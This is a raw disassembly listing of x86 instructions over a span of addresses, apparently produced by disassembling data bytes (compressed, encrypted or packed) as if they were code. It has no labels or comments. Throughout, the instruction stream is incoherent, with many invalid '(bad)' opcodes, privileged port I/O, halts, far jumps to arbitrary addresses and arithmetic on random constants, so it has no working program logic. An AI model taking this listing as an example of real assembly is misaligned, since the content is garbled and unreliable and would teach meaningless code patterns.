  42dfbf:	pop    ecx
  42dfc0:	inc    edx
  42dfc1:	das    
  42dfc2:	aaa    
  42dfc3:	js     0x42df92
  42dfc5:	pop    edx
  42dfc6:	inc    edx
  42dfc7:	je     0x42df92
  42dfc9:	push   ds
  42dfca:	xor    DWORD PTR es:[ebp+0x12],0xffffff93
  42dfcf:	scas   eax,DWORD PTR es:[edi]
  42dfd0:	dec    ebp
  42dfd1:	xor    bl,dh
  42dfd3:	cwde   
  42dfd4:	pop    ss
  42dfd5:	jle    0x42df79
  42dfd7:	fsubr  DWORD PTR [ebx-0x66faa962]
  42dfdd:	mov    ebx,edi
  42dfdf:	inc    si
  42dfe1:	and    DWORD PTR [eax-0x66e06df3],ebp
  42dfe7:	daa    
  42dfe8:	pop    ebp
  42dfe9:	pop    edx
  42dfea:	mov    bh,0xe7
  42dfed:	dec    ebx
  42dfee:	inc    ebx
  42dfef:	push   eax
  42dff0:	jge    0x42dfd4
  42dff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dff3:	mov    al,ds:0x7e3df1a1
  42dff8:	fldcw  WORD PTR [ebp+0xfd881a5]
  42dffe:	in     al,0x70
  42e000:	or     edx,ebx
  42e002:	sub    esi,DWORD PTR [eax+eax*4+0x71]
  42e006:	mov    ecx,0x2928dcf5
  42e00b:	scas   eax,DWORD PTR es:[edi]
  42e00c:	test   bl,al
  42e00e:	adc    al,0xe9
  42e010:	sbb    eax,0xa1007c37
  42e015:	adc    DWORD PTR [ecx],edi
  42e017:	out    0x4a,eax
  42e019:	inc    esp
  42e01a:	fiadd  DWORD PTR [esi]
  42e01c:	jnp    0x42dffd
  42e01e:	pop    edx
  42e01f:	mov    dl,0xda
  42e021:	sbb    DWORD PTR [ecx+0x7a4ab7bf],ebp
  42e027:	pop    ebx
  42e028:	cmp    DWORD PTR [edx],ecx
  42e02a:	adc    ebx,DWORD PTR ds:0x684f4202
  42e030:	inc    eax
  42e031:	rcl    BYTE PTR [eax],1
  42e033:	or     eax,0x35ebd4e2
  42e038:	jns    0x42e013
  42e03a:	push   esp
  42e03b:	in     eax,0x89
  42e03d:	inc    ecx
  42e03e:	cld    
  42e03f:	jae    0x42e003
  42e041:	jne    0x42dff5
  42e043:	(bad)  
  42e044:	pop    edx
  42e045:	fs push esi
  42e047:	jmp    0x3e4e:0x8ce4a879
  42e04e:	add    al,0x92
  42e050:	call   0x500cc808
  42e055:	cdq    
  42e056:	dec    eax
  42e057:	sub    DWORD PTR [esi],0x2a2cb496
  42e05d:	sbb    esp,ecx
  42e05f:	xchg   esp,eax
  42e060:	inc    esi
  42e061:	sti    
  42e062:	lea    esi,[edi+0x69]
  42e065:	hlt    
  42e066:	addr16 shl edi,0xe6
  42e06a:	sbb    al,0xff
  42e06c:	cmp    DWORD PTR fs:[esi+edx*4],ecx
  42e070:	xchg   edx,eax
  42e071:	cmp    DWORD PTR [ebp+0x593d2f6c],edi
  42e077:	add    DWORD PTR [eax-0x39e59de5],edx
  42e07d:	sahf   
  42e07e:	ins    DWORD PTR es:[edi],dx
  42e07f:	sub    ebx,DWORD PTR [edi-0x6e]
  42e082:	out    dx,al
  42e083:	xchg   ebp,eax
  42e084:	push   eax
  42e085:	repz fist DWORD PTR [ebp-0x5a]
  42e089:	aam    0xc2
  42e08b:	retf   0xf2b4
  42e08e:	sub    al,0x69
  42e090:	jge    0x42e07f
  42e092:	inc    esp
  42e093:	lods   eax,DWORD PTR ds:[esi]
  42e094:	ror    BYTE PTR cs:[esi+0x524593d0],cl
  42e09b:	push   esi
  42e09c:	push   edi
  42e09d:	dec    ebp
  42e09e:	and    DWORD PTR [ebx+0x3b],edi
  42e0a1:	xor    esi,DWORD PTR [ebx+0x52]
  42e0a4:	mov    ah,0x52
  42e0a6:	rcr    esi,cl
  42e0a8:	rcl    DWORD PTR [ebx],0x7
  42e0ab:	sbb    DWORD PTR [ebx*1-0x36a7bbc4],edx
  42e0b2:	dec    esi
  42e0b3:	mov    dl,0x7f
	...
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	mov    BYTE PTR [edi-0x71d22e5c],0xed
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    cl,dl
  42e12f:	adc    BYTE PTR [edi-0x4],0xf6
  42e133:	imul   esp,DWORD PTR ds:0xf1c432a3,0x6b141f71
  42e13d:	mov    dh,0x66
  42e13f:	and    esi,ecx
  42e141:	scas   al,BYTE PTR es:[edi]
  42e142:	es cmp eax,0xfa44cd33
  42e148:	xor    edi,ebx
  42e14a:	aas    
  42e14b:	sub    ecx,ebp
  42e14d:	xchg   DWORD PTR [edx+0x3ef21cb7],ecx
  42e153:	popa   
  42e154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e155:	push   ebp
  42e156:	or     DWORD PTR [edi-0x6b],ecx
  42e159:	mov    ch,0xf1
  42e15b:	pop    esi
  42e15c:	dec    edx
  42e15d:	and    DWORD PTR [edx+0x1],esi
  42e160:	fxch   st(2)
  42e162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e163:	jnp    0x42e1b9
  42e165:	aam    0x9b
  42e167:	and    edi,ebp
  42e169:	adc    edx,eax
  42e16b:	repnz outs dx,DWORD PTR ds:[esi]
  42e16d:	push   ebx
  42e16e:	dec    esp
  42e16f:	ss jecxz 0x42e165
  42e172:	rcr    bl,1
  42e174:	sbb    dl,ah
  42e176:	mov    dl,0x30
  42e178:	icebp  
  42e179:	(bad)  
  42e17a:	out    0x7b,eax
  42e17c:	jp     0x42e155
  42e17e:	mov    dh,0xbe
  42e180:	mov    WORD PTR [ebp+0x20],?
  42e183:	data16 fstp DWORD PTR [ebp+0x2fe1fcef]
  42e18a:	mov    edx,DWORD PTR [ecx+0x48cf2437]
  42e190:	pop    ecx
  42e191:	xchg   esp,eax
  42e192:	(bad)
  42e196:	push   eax
  42e197:	lods   eax,DWORD PTR ds:[esi]
  42e198:	lock ins BYTE PTR es:[edi],dx
  42e19a:	retf   
  42e19b:	sbb    DWORD PTR [edi+ebp*2],edi
  42e19e:	add    bh,bl
  42e1a0:	push   ecx
  42e1a1:	and    eax,0xa690aca8
  42e1a6:	fdivr  st(4),st
  42e1a8:	adc    BYTE PTR [ebx+ebx*4+0x75],dh
  42e1ac:	sub    BYTE PTR [esi],ah
  42e1ae:	xchg   bh,al
  42e1b0:	push   edi
  42e1b1:	cmp    DWORD PTR [eax-0x5288ae1d],esi
  42e1b7:	jge    0x42e168
  42e1b9:	ds leave 
  42e1bb:	adc    bh,al
  42e1bd:	mov    cl,0x76
  42e1bf:	sbb    dh,BYTE PTR [ebx-0x948be7d]
  42e1c5:	loop   0x42e174
  42e1c7:	xor    BYTE PTR [ecx+ecx*4],al
  42e1ca:	push   ds
  42e1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1cc:	xchg   edx,eax
  42e1cd:	fnstcw WORD PTR [edx]
  42e1cf:	push   0xffffffcc
  42e1d1:	jb     0x42e1e7
  42e1d3:	js     0x42e18a
  42e1d5:	aam    0xfd
  42e1d7:	jns    0x42e1da
  42e1d9:	pop    edi
  42e1da:	nop
  42e1db:	xchg   ecx,eax
  42e1dc:	mov    al,ds:0xd84c35df
  42e1e1:	cwde   
  42e1e2:	mov    edi,0xfce97592
  42e1e7:	sbb    al,BYTE PTR [eax+0xd3c936]
  42e1ed:	arpl   WORD PTR [ecx],bp
  42e1ef:	xchg   ebx,eax
  42e1f0:	fsub   DWORD PTR [ebp+0x2288860f]
  42e1f6:	lods   eax,DWORD PTR ds:[esi]
  42e1f7:	push   cs
  42e1f8:	jl     0x42e1a0
  42e1fa:	data16 ss js 0x42e1af
  42e1fe:	fs jae 0x42e1ab
  42e201:	mov    bh,0xe7
  42e203:	fs ss retf 
  42e206:	data16 fsincos 
  42e209:	jmp    0x42e202
  42e20b:	pushf  
  42e20c:	xor    DWORD PTR [esi],edx
  42e20e:	dec    edx
  42e20f:	outs   dx,BYTE PTR ds:[esi]
  42e210:	les    edx,FWORD PTR [ecx+0xfe410f]
  42e216:	xchg   ebp,eax
  42e217:	fwait
  42e218:	mov    al,0x3e
  42e21a:	idiv   cl
  42e21c:	cmc    
  42e21d:	push   ebx
  42e21e:	sbb    ebx,DWORD PTR [ecx]
  42e220:	scas   al,BYTE PTR es:[edi]
  42e221:	out    dx,al
  42e222:	sbb    esi,esp
  42e224:	es lahf 
  42e226:	cld    
  42e227:	imul   edi,edi,0xa50c0944
  42e22d:	mov    BYTE PTR [ebx+0x14277cf7],0x66
  42e234:	fadd   QWORD PTR [eax]
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0xbc735df2
  42e2a5:	hlt    
  42e2a6:	xchg   ebp,eax
  42e2a7:	out    dx,al
  42e2a8:	add    DWORD PTR [eax],eax
  42e2aa:	pop    es
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    BYTE PTR [ecx-0x27],dl
  42e2b0:	cwde   
  42e2b1:	cli    
  42e2b2:	rcl    DWORD PTR [ebp+0x5e3c7b10],1
  42e2b8:	jg     0x42e2ab
  42e2ba:	sub    bl,dh
  42e2bc:	popa   
  42e2bd:	dec    esp
  42e2be:	pop    ds
  42e2bf:	shr    DWORD PTR [edx],cl
  42e2c1:	push   esp
  42e2c2:	mov    bh,0x32
  42e2c4:	cmp    eax,0x18d4c652
  42e2c9:	aam    0x4f
  42e2cb:	sahf   
  42e2cc:	mov    eax,0x3b468987
  42e2d1:	cwde   
  42e2d2:	out    0x13,al
  42e2d4:	jle    0x42e29d
  42e2d6:	mov    BYTE PTR [ebx+0x6],dl
  42e2d9:	out    dx,al
  42e2da:	jmp    0x42e275
  42e2dc:	pop    ecx
  42e2dd:	pushf  
  42e2de:	js     0x42e337
  42e2e0:	ds sbb al,0xe4
  42e2e3:	xchg   esp,eax
  42e2e4:	push   ebx
  42e2e5:	push   eax
  42e2e6:	push   ecx
  42e2e7:	adc    BYTE PTR [ebp-0x64],ah
  42e2ea:	dec    esp
  42e2eb:	lods   eax,DWORD PTR ds:[esi]
  42e2ec:	pop    eax
  42e2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2ee:	sahf   
  42e2ef:	or     ecx,DWORD PTR [esp+edx*4]
  42e2f2:	fwait
  42e2f3:	push   0x16a7dfac
  42e2f8:	rol    DWORD PTR [edi+ecx*8-0x3da91a56],cl
  42e2ff:	jb     0x42e305
  42e301:	repz fst DWORD PTR [ebp+ecx*4+0x78]
  42e306:	shl    BYTE PTR [edx-0xc],cl
  42e309:	dec    ecx
  42e30a:	ret    
  42e30b:	ffree  st(0)
  42e30d:	fistp  DWORD PTR [ecx-0x6fddea26]
  42e313:	mov    eax,ds:0xfc5b94d3
  42e318:	iret   
  42e319:	xchg   ecx,eax
  42e31a:	lods   eax,DWORD PTR ds:[esi]
  42e31b:	clc    
  42e31c:	hlt    
  42e31d:	sub    eax,0xab247aff
  42e322:	xchg   esp,eax
  42e323:	dec    eax
  42e324:	fild   WORD PTR [eax-0x1e4f9374]
  42e32a:	inc    edi
  42e32b:	jmp    0x42e305
  42e32d:	out    dx,al
  42e32e:	pop    ebp
  42e32f:	jb     0x42e350
  42e331:	and    DWORD PTR [edx+0x1dbad3c4],esi
  42e337:	aas    
  42e338:	jne    0x42e3a1
  42e33a:	pop    ss
  42e33b:	jle    0x42e377
  42e33d:	sub    eax,DWORD PTR [ebx-0x3b]
  42e340:	inc    eax
  42e341:	shl    BYTE PTR [eax-0x1a],cl
  42e344:	or     eax,0x9d597322
  42e349:	je     0x42e326
  42e34b:	fcomip st,st(1)
  42e34d:	test   bh,ah
  42e34f:	sub    DWORD PTR [edx+0x5771008d],ebp
  42e355:	daa    
  42e356:	sar    DWORD PTR [esi+0x78],1
  42e359:	mov    ah,0x8f
  42e35b:	nop
  42e35c:	or     bl,BYTE PTR [eax+0x4b7f39bd]
  42e362:	mov    ch,0x7d
  42e364:	inc    ecx
  42e365:	shl    DWORD PTR [ecx+0x72],0x76
  42e369:	add    eax,0x50b71bd2
  42e36e:	mov    ?,WORD PTR [esi+0x460409be]
  42e374:	loopne 0x42e3b7
  42e376:	outs   dx,BYTE PTR ds:[esi]
  42e377:	cwde   
  42e378:	xchg   DWORD PTR [ebp-0x7f47e62e],ecx
  42e37e:	mov    eax,ds:0xb12d218e
  42e383:	jecxz  0x42e3a2
  42e385:	pop    es
  42e386:	addr16 cwde 
  42e388:	ins    BYTE PTR es:[edi],dx
  42e389:	and    edx,esp
  42e38b:	(bad)  
  42e38c:	sar    DWORD PTR [edx-0x30b1fa9],1
  42e392:	mov    bh,BYTE PTR [esp+ecx*4-0x3b]
  42e396:	ins    DWORD PTR es:[edi],dx
  42e397:	sub    eax,DWORD PTR [ebx]
  42e399:	retf   0xfc7a
  42e39c:	into   
  42e39d:	inc    edx
  42e39e:	mov    edx,0x92668266
  42e3a3:	lods   eax,DWORD PTR ds:[esi]
  42e3a4:	jae    0x42e400
  42e3a6:	(bad)  
  42e3a7:	cwde   
  42e3a8:	lods   eax,DWORD PTR ds:[esi]
  42e3a9:	cld    
  42e3aa:	cwde   
  42e3ab:	pushf  
  42e3ac:	leave  
  42e3ad:	fs je  0x42e33e
  42e3b0:	scas   eax,DWORD PTR es:[edi]
  42e3b1:	xor    bl,bl
  42e3b3:	xchg   esp,eax
  42e3b4:	sahf   
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	loop   0x42e3dd
  42e424:	mov    DWORD PTR [edi+0x1ef9c],ebp
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [esi+edi*1+0x48],ah
  42e431:	push   edx
  42e432:	mov    ecx,0x6d0f3ce2
  42e437:	mov    WORD PTR [esi-0x31e7b00c],ss
  42e43d:	jp     0x42e4b8
  42e43f:	(bad)  
  42e440:	push   ebp
  42e441:	jbe    0x42e4b8
  42e443:	sbb    dh,BYTE PTR [ecx]
  42e445:	lds    esp,FWORD PTR [ebx+0xb]
  42e448:	adc    cl,dl
  42e44a:	dec    esi
  42e44b:	aam    0x43
  42e44d:	(bad)  
  42e44e:	xor    DWORD PTR [ebx+0x4b171aa6],edi
  42e454:	sub    ebp,DWORD PTR ds:0x49bc4cf1
  42e45a:	ins    BYTE PTR es:[edi],dx
  42e45b:	jge    0x42e459
  42e45d:	lock je 0x42e465
  42e460:	mov    BYTE PTR [edx-0x4b],cl
  42e463:	neg    DWORD PTR [edi-0x4a977bc7]
  42e469:	leave  
  42e46a:	(bad)  
  42e46b:	sbb    DWORD PTR [eax-0x4104bab9],esi
  42e471:	pop    esp
  42e472:	and    al,dl
  42e474:	pminsw mm0,QWORD PTR [ecx]
  42e477:	clc    
  42e478:	popf   
  42e479:	mov    ds:0x4228690e,eax
  42e47e:	jmp    0xc23e0be2
  42e483:	out    dx,al
  42e484:	mov    ecx,0xe0324e5a
  42e489:	test   al,0x24
  42e48b:	pushf  
  42e48c:	int    0xab
  42e48e:	xchg   DWORD PTR [ebx-0x521c4803],esp
  42e494:	sub    ebx,esi
  42e496:	retf   0xdae6
  42e499:	(bad)  [esi-0x4752a771]
  42e49f:	push   esi
  42e4a0:	in     eax,0x23
  42e4a2:	test   eax,0x9dc58ba8
  42e4a7:	pop    es
  42e4a8:	imul   edi,DWORD PTR [esi-0xf2336dd],0x52e19f7e
  42e4b2:	mov    eax,0xb2155ab0
  42e4b7:	inc    esp
  42e4b8:	ror    DWORD PTR ds:0xc0d08fa6,0x9d
  42e4bf:	(bad)  
  42e4c0:	mov    ss,WORD PTR [edi+0x782b82c2]
  42e4c6:	cmp    ch,BYTE PTR [esi]
  42e4c8:	dec    edi
  42e4c9:	mov    dh,0x9f
  42e4cb:	enter  0x3483,0xaf
  42e4cf:	cmp    ebx,ebp
  42e4d1:	push   cs
  42e4d2:	fnstenv [eax-0x5a]
  42e4d5:	out    dx,al
  42e4d6:	fldenv [edi-0x4c1a854e]
  42e4dc:	aam    0x7c
  42e4de:	and    cl,0x86
  42e4e1:	cmp    DWORD PTR [ebp+0x5f5f8b97],esp
  42e4e7:	push   eax
  42e4e8:	sbb    cl,BYTE PTR [edi-0x5548e8b7]
  42e4ee:	dec    esp
  42e4ef:	aad    0x3d
  42e4f1:	mov    DWORD PTR [ecx+0x10],esi
  42e4f4:	test   eax,0x77d0aaf0
  42e4f9:	lods   eax,DWORD PTR ds:[esi]
  42e4fa:	jno    0x42e4f6
  42e4fc:	fnstenv [edx+0x15]
  42e4ff:	mov    cl,0x64
  42e501:	pop    ebx
  42e502:	xchg   BYTE PTR [edx],dl
  42e504:	ins    DWORD PTR es:[edi],dx
  42e505:	pusha  
  42e506:	mov    WORD PTR [eax+0x52],gs
  42e509:	pushf  
  42e50a:	mov    cs,ebx
  42e50c:	sub    ch,0xc8
  42e50f:	sub    DWORD PTR [esp+edi*4+0x148e031a],eax
  42e516:	ret    0xaca3
  42e519:	mov    BYTE PTR cs:[ebx-0x59],dl
  42e51d:	mov    ebp,esi
  42e51f:	mov    bh,0x17
  42e521:	sbb    eax,DWORD PTR [ecx+0x21]
  42e524:	loope  0x42e54d
  42e526:	jge    0x42e517
  42e528:	push   es
  42e529:	cmp    DWORD PTR [esp+esi*2-0x9],ebp
  42e52d:	xor    DWORD PTR [edi+0x42],esi
  42e530:	xchg   esp,eax
  42e531:	push   ebp
  42e532:	aas    
  42e533:	pop    esi
  42e534:	adc    DWORD PTR [eax],eax
	...
  42e596:	push   ebp
  42e597:	cmp    dh,cl
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	ins    DWORD PTR es:[edi],dx
  42e5a3:	repnz (bad) [eax+0x1f0a3]
  42e5aa:	pop    es
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    bl,dh
  42e5af:	or     eax,0xa529591c
  42e5b4:	out    0x15,al
  42e5b6:	mov    ebp,0xf6e1cf05
  42e5bb:	mov    cl,0x75
  42e5bd:	pop    esi
  42e5be:	mov    WORD PTR gs:[esi+0x31],?
  42e5c2:	and    eax,0x1bd06086
  42e5c7:	ret    
  42e5c8:	adc    eax,0x94a00482
  42e5cd:	aad    0x73
  42e5cf:	inc    esi
  42e5d0:	mov    DWORD PTR [edx],0x73b7d366
  42e5d6:	neg    BYTE PTR [ecx]
  42e5d8:	sub    dh,BYTE PTR [ecx+0x2f]
  42e5db:	pop    eax
  42e5dc:	xchg   dl,al
  42e5de:	push   0xd217c76a
  42e5e3:	jno    0x42e638
  42e5e5:	jno    0x42e5a6
  42e5e7:	or     dl,BYTE PTR [ecx+0x1fc6e030]
  42e5ed:	sub    al,0x36
  42e5ef:	icebp  
  42e5f0:	sbb    DWORD PTR [ecx-0x4a91a467],edx
  42e5f6:	fst    DWORD PTR [edx+0x2108e97d]
  42e5fc:	sub    ch,al
  42e5fe:	jmp    0xecef8af7
  42e603:	shl    WORD PTR [eax-0x71],0x82
  42e608:	xchg   ebp,eax
  42e609:	jno    0x42e5fb
  42e60b:	pop    ebp
  42e60c:	mov    ecx,0xc11bd687
  42e611:	repnz (bad)
  42e614:	xchg   ecx,eax
  42e615:	nop
  42e616:	das    
  42e617:	stc    
  42e618:	mov    ch,0x36
  42e61a:	shl    DWORD PTR [ecx],cl
  42e61c:	shl    DWORD PTR [edx-0x4906ced3],0x15
  42e623:	es stos DWORD PTR es:[edi],eax
  42e625:	or     al,0xd1
  42e627:	or     BYTE PTR [ebx],0xb0
  42e62a:	xchg   edi,eax
  42e62b:	push   ds
  42e62c:	push   ebx
  42e62d:	xor    al,0xd4
  42e62f:	mov    dh,al
  42e631:	adc    BYTE PTR [ebp+0x68650e35],bh
  42e637:	ret    0x8277
  42e63a:	(bad)  
  42e63b:	in     al,0x28
  42e63d:	inc    edi
  42e63e:	(bad)  
  42e63f:	mov    cl,BYTE PTR [edi]
  42e641:	in     eax,0x36
  42e643:	jnp    0x42e67c
  42e645:	ja     0x42e649
  42e647:	out    dx,eax
  42e648:	popf   
  42e649:	jmp    0xcd819e04
  42e64e:	out    dx,al
  42e64f:	jle    0x42e61a
  42e651:	mov    cl,BYTE PTR [ecx-0x69977af7]
  42e657:	aaa    
  42e658:	jno    0x42e6ac
  42e65a:	daa    
  42e65b:	adc    DWORD PTR [ebx],0xbbb449b4
  42e661:	push   DWORD PTR [eax-0x7942f1c2]
  42e667:	or     BYTE PTR [ebx],bh
  42e669:	lea    ecx,[esi+ebx*8-0x115e8b2c]
  42e670:	nop
  42e671:	adc    ch,BYTE PTR [ebx+0x18]
  42e674:	jbe    0x42e676
  42e676:	jmp    0xea28917d
  42e67b:	sub    ebp,ecx
  42e67d:	in     eax,0xc9
  42e67f:	xchg   ecx,eax
  42e680:	int3   
  42e681:	push   esp
  42e682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e683:	dec    edi
  42e684:	(bad)  [eax-0x5aecc299]
  42e68a:	and    cl,BYTE PTR [eax+0x6481c1c4]
  42e690:	pop    edi
  42e691:	int3   
  42e692:	mov    al,ds:0x95e1e99c
  42e697:	mov    DWORD PTR [edx+0x3985daa],ebx
  42e69d:	sub    edx,DWORD PTR [eax-0x7122de8f]
  42e6a3:	dec    ebp
  42e6a4:	pushf  
  42e6a5:	ja     0x42e6a3
  42e6a7:	test   edi,ebx
  42e6a9:	dec    ebp
  42e6aa:	das    
  42e6ab:	shr    DWORD PTR [edi-0x24],0x4e
  42e6af:	mov    dl,0x27
  42e6b1:	gs icebp 
  42e6b3:	mov    ?,WORD PTR [edx+0x0]
	...
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	mov    ds:0xaa7233c0,eax
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [ebx+esi*8],al
  42e730:	jmp    0x42e75f
  42e732:	mov    eax,0x29d2bffb
  42e737:	retf   0x9bce
  42e73a:	mov    ecx,0x42fb73cc
  42e73f:	and    eax,0x8f0965ee
  42e744:	adc    ch,BYTE PTR ds:0x8b1cb7f
  42e74a:	sar    edx,1
  42e74c:	pop    ds
  42e74d:	(bad)  
  42e74e:	sti    
  42e74f:	xchg   ebx,eax
  42e750:	dec    edi
  42e751:	test   al,0x3f
  42e753:	das    
  42e754:	and    al,0xb8
  42e756:	jbe    0x42e704
  42e758:	or     al,0xc8
  42e75a:	push   esi
  42e75b:	sbb    eax,0xe8298b48
  42e760:	sub    eax,0x4e96038f
  42e765:	mov    ebx,DWORD PTR [eax+0x34]
  42e768:	pop    edx
  42e769:	push   ebx
  42e76a:	sbb    ah,cl
  42e76c:	stos   BYTE PTR es:[edi],al
  42e76d:	pusha  
  42e76e:	sar    BYTE PTR [edx+0x1a4343a3],0x35
  42e775:	pop    edi
  42e776:	das    
  42e777:	arpl   WORD PTR ds:0xd032502d,dx
  42e77d:	xchg   ebp,eax
  42e77e:	in     al,dx
  42e77f:	and    ah,dh
  42e781:	sub    cl,BYTE PTR [edi+edi*4]
  42e784:	lods   al,BYTE PTR ds:[si]
  42e786:	leave  
  42e787:	adc    BYTE PTR [esi],al
  42e789:	sbb    dh,BYTE PTR [ebx-0x5d68bb7]
  42e78f:	mov    ah,bl
  42e791:	or     al,0x40
  42e793:	cmc    
  42e794:	dec    ecx
  42e795:	mov    BYTE PTR [esi-0x524d2062],al
  42e79b:	jl     0x42e748
  42e79d:	jns    0x42e7db
  42e79f:	xor    bh,BYTE PTR [eax+0x1819687c]
  42e7a5:	or     DWORD PTR [edx+0x42],esi
  42e7a8:	and    BYTE PTR [ecx-0x48729d73],bl
  42e7ae:	jb     0x42e808
  42e7b0:	pop    ebp
  42e7b1:	push   ds
  42e7b2:	test   al,0x54
  42e7b4:	int3   
  42e7b5:	xchg   bp,ax
  42e7b7:	dec    esi
  42e7b8:	add    ecx,ecx
  42e7ba:	push   esp
  42e7bb:	dec    ecx
  42e7bc:	push   es
  42e7bd:	pop    ecx
  42e7be:	call   0x75396127
  42e7c3:	mov    esp,0x21247f7a
  42e7c8:	lds    ecx,FWORD PTR [ebx+0x77a06bb4]
  42e7ce:	ror    DWORD PTR [edx-0x2ff40364],cl
  42e7d4:	ins    BYTE PTR es:[edi],dx
  42e7d5:	adc    edx,ecx
  42e7d7:	outs   dx,DWORD PTR ds:[esi]
  42e7d8:	and    eax,0x610b89da
  42e7dd:	dec    ecx
  42e7de:	into   
  42e7df:	or     eax,0x63c5a15d
  42e7e4:	lods   al,BYTE PTR ds:[esi]
  42e7e5:	push   cs
  42e7e6:	cmp    DWORD PTR [ebx-0x454e15a3],edi
  42e7ec:	ins    DWORD PTR es:[edi],dx
  42e7ed:	pop    es
  42e7ee:	enter  0x6d9b,0xac
  42e7f2:	pop    eax
  42e7f3:	xor    DWORD PTR [esi+0x57],eax
  42e7f6:	ja     0x42e82b
  42e7f8:	and    esi,0xb8a19810
  42e7fe:	add    edx,DWORD PTR [ebx-0x2a6a6c41]
  42e804:	inc    esi
  42e805:	ror    DWORD PTR [eax-0x15],cl
  42e808:	fprem  
  42e80a:	and    DWORD PTR ds:0x80c59c7e,ecx
  42e810:	fadd   DWORD PTR [ebp+eax*4+0x6]
  42e814:	repz sub al,BYTE PTR [eax]
  42e817:	in     al,dx
  42e818:	mov    ?,WORD PTR [esi+0x44e72ea3]
  42e81e:	and    edi,DWORD PTR [edx]
  42e820:	mov    edi,0xa2b6f1df
  42e825:	loop   0x42e872
  42e827:	out    0xa9,eax
  42e829:	dec    ebp
  42e82a:	cmp    al,0xc2
  42e82c:	dec    edi
  42e82d:	sti    
  42e82e:	jb     0x42e865
  42e830:	mov    dh,0x3c
  42e832:	dec    esp
  42e833:	cwde   
  42e834:	sub    DWORD PTR [eax],eax
	...
  42e896:	ret    
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x2a6f13c3]
  42e8a3:	in     al,0xde
  42e8a5:	imul   esi,DWORD PTR [ecx+0x70001f2],0x1
  42e8ac:	add    BYTE PTR [eax],al
  42e8ae:	jnp    0x42e845
  42e8b0:	in     eax,0x33
  42e8b2:	test   al,0xa3
  42e8b4:	mov    eax,ds:0x80e627a1
  42e8b9:	fs ret 
  42e8bb:	xchg   ebp,eax
  42e8bc:	add    eax,0xa9abfc7b
  42e8c1:	in     al,dx
  42e8c2:	dec    esi
  42e8c3:	lods   al,BYTE PTR ds:[esi]
  42e8c4:	(bad)  
  42e8c5:	out    dx,eax
  42e8c6:	dec    ebx
  42e8c7:	jne    0x42e944
  42e8c9:	std    
  42e8ca:	push   esi
  42e8cb:	shr    DWORD PTR [ebx+0x11],0xdd
  42e8cf:	imul   eax,DWORD PTR [esp+edx*2+0x20def644],0xcd6ce22a
  42e8da:	jne    0x42e87b
  42e8dc:	add    bl,ch
  42e8de:	mov    al,ds:0xf8a91f81
  42e8e3:	(bad)  
  42e8e5:	fstp   TBYTE PTR [ebx+ecx*2+0x77]
  42e8e9:	mov    ch,0x92
  42e8eb:	stos   DWORD PTR es:[edi],eax
  42e8ec:	sbb    al,0xd5
  42e8ee:	retf   0x6ee7
  42e8f1:	xchg   ecx,eax
  42e8f2:	dec    ecx
  42e8f3:	push   0xffffffe5
  42e8f5:	(bad)  
  42e8f6:	mov    edx,0x8131f9a3
  42e8fb:	adc    eax,0x5f3703ed
  42e900:	or     dh,dl
  42e902:	rcr    BYTE PTR [esi+ebx*4-0x4c],1
  42e906:	pop    edx
  42e907:	bound  esi,QWORD PTR [ecx+ebp*8+0x40]
  42e90b:	in     eax,dx
  42e90c:	inc    esp
  42e90d:	mov    dh,0x45
  42e90f:	retf   0x9144
  42e912:	push   cs
  42e913:	or     edx,DWORD PTR [ecx-0x5a]
  42e916:	mov    ds:0xb58b57e8,eax
  42e91b:	dec    ebx
  42e91c:	inc    edx
  42e91d:	dec    esi
  42e91e:	mov    BYTE PTR [esi+0x8],bh
  42e921:	mov    ebp,0x8949dad2
  42e926:	iret   
  42e927:	add    bh,BYTE PTR [ebx+0x9]
  42e92a:	mov    cl,0x13
  42e92c:	mov    edx,0x4189b013
  42e931:	sbb    BYTE PTR [eax+0x63],al
  42e934:	fwait
  42e935:	cwde   
  42e936:	iret   
  42e937:	(bad)  
  42e938:	push   ebx
  42e939:	aam    0x8
  42e93b:	mov    bl,0x5e
  42e93d:	mov    esp,0x88687a86
  42e942:	test   esi,0x48a26bcb
  42e948:	push   ebp
  42e949:	dec    esi
  42e94a:	adc    al,0x79
  42e94c:	(bad)  
  42e94d:	mov    al,0xe2
  42e94f:	dec    ebp
  42e950:	pop    ss
  42e951:	in     al,0xe9
  42e953:	hlt    
  42e954:	mov    edx,0xff6d8c79
  42e959:	imul   esi,DWORD PTR [edx+0x44],0x6d
  42e95d:	push   ebp
  42e95e:	les    ecx,FWORD PTR [eax+edi*1]
  42e961:	mov    eax,ds:0xdd3eb916
  42e966:	out    0xda,al
